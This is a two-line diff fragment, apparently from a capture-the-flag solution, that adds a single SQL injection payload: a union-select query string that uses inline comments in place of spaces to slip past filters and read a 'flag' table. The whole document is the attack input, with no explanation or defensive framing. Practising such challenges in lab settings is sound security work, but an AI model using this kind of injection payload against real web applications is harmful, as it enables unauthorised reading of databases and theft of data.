@@ -1,0 +1,2 @@
+payload:
+?id=1'/**/union/**/select/**/flag/**/from/**/flag/**/where/**/'1'='1
